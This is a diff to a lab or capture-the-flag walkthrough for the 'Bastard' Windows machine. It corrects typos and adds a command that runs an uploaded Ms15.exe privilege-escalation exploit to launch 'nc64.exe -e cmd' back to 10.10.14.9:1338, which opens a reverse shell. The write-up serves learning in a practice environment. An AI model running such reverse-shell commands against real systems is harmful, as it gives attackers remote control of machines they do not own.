@@ -177,9 +177,13 @@ now when we go and run we get a confirmation
 
 ![](/Windows/Windows-Medium/Bastard/Screenshots/whoami.png)
 
-since we can execute soame command using that we need a permanet shell that is easy to use so what we can do id to download a 64 `nc` so that we can use it to execute a reverse shell into the root user. [nc](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)
+since we can execute some command using that we need a permanet shell that is easy to use so what we can do is to download a 64 `nc` so that we can use it to execute a reverse shell into the root user. [nc](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) we just upload it the way we uploaded the `Ms15.exe`
 
 and by doing this from the shell 
+
+```sh
+./Ms15.exe "nc64.exe -e cmd 10.10.14.9 1338"
+```
 
 ![](/Windows/Windows-Medium/Bastard/Screenshots/shellcode.png)
 
